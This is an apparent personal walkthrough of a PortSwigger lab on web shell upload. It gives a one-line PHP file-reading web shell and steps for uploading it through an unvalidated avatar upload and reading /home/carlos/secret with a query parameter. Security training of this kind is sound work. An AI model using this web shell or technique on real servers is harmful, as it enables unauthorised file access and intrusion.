https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

 upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image 

3) open the image in another tab and add the query parameter to have 
    /files/avatars/exploit.php?filepath=/home/carlos/secret

4) done

NOTE: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved.
